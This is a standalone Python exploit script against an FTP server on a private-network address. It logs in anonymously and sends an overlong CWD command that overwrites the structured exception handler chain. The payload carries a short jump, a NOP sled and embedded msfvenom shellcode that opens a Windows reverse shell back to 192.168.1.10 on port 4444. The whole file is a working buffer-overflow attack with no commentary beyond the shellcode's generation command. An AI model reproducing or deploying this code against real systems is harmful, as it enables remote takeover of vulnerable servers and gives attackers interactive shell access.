#!/usr/bin/python

import socket,sys,os,struct

host = '192.168.1.36'
port = 21

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c -b "\x00" EXITFUNC=thread
shellcode = ("\xba\x24\xa2\x40\x34\xda\xd5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x83\xee\xfc\x31\x56\x0e\x03\x72\xac\xa2\xc1\x86\x58\xa0"
"\x2a\x76\x99\xc5\xa3\x93\xa8\xc5\xd0\xd0\x9b\xf5\x93\xb4\x17"
"\x7d\xf1\x2c\xa3\xf3\xde\x43\x04\xb9\x38\x6a\x95\x92\x79\xed"
"\x15\xe9\xad\xcd\x24\x22\xa0\x0c\x60\x5f\x49\x5c\x39\x2b\xfc"
"\x70\x4e\x61\x3d\xfb\x1c\x67\x45\x18\xd4\x86\x64\x8f\x6e\xd1"
"\xa6\x2e\xa2\x69\xef\x28\xa7\x54\xb9\xc3\x13\x22\x38\x05\x6a"
"\xcb\x97\x68\x42\x3e\xe9\xad\x65\xa1\x9c\xc7\x95\x5c\xa7\x1c"
"\xe7\xba\x22\x86\x4f\x48\x94\x62\x71\x9d\x43\xe1\x7d\x6a\x07"
"\xad\x61\x6d\xc4\xc6\x9e\xe6\xeb\x08\x17\xbc\xcf\x8c\x73\x66"
"\x71\x95\xd9\xc9\x8e\xc5\x81\xb6\x2a\x8e\x2c\xa2\x46\xcd\x38"
"\x07\x6b\xed\xb8\x0f\xfc\x9e\x8a\x90\x56\x08\xa7\x59\x71\xcf"
"\xc8\x73\xc5\x5f\x37\x7c\x36\x76\xfc\x28\x66\xe0\xd5\x50\xed"
"\xf0\xda\x84\xa2\xa0\x74\x77\x03\x10\x35\x27\xeb\x7a\xba\x18"
"\x0b\x85\x10\x31\xa6\x7c\xf3\xfe\x9f\x7f\x09\x97\xdd\x7f\x1c"
"\x3b\x6b\x99\x74\xd3\x3d\x32\xe1\x4a\x64\xc8\x90\x93\xb2\xb5"
"\x93\x18\x31\x4a\x5d\xe9\x3c\x58\x0a\x19\x0b\x02\x9d\x26\xa1"
"\x2a\x41\xb4\x2e\xaa\x0c\xa5\xf8\xfd\x59\x1b\xf1\x6b\x74\x02"
"\xab\x89\x85\xd2\x94\x09\x52\x27\x1a\x90\x17\x13\x38\x82\xe1"
"\x9c\x04\xf6\xbd\xca\xd2\xa0\x7b\xa5\x94\x1a\xd2\x1a\x7f\xca"
"\xa3\x50\x40\x8c\xab\xbc\x36\x70\x1d\x69\x0f\x8f\x92\xfd\x87"
"\xe8\xce\x9d\x68\x23\x4b\xbd\x8a\xe1\xa6\x56\x13\x60\x0b\x3b"
"\xa4\x5f\x48\x42\x27\x55\x31\xb1\x37\x1c\x34\xfd\xff\xcd\x44"
"\x6e\x6a\xf1\xfb\x8f\xbf")

nseh = '\x74\x08\x75\x06'
seh = struct.pack("<I",0x1220401e)

payload = 'A' * (1041 - len(nseh))
payload += nseh
payload += seh
payload += '\x90' * 20
payload += shellcode
payload += 'D' * (2000 - len(payload))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(10000)
sock.send("USER anonymous\r\n")
sock.recv(10000)
sock.send("PASS password\r\n")
sock.recv(10000)
sock.send("CWD " + payload + "\r\n")
sock.recv(10000)
sock.close()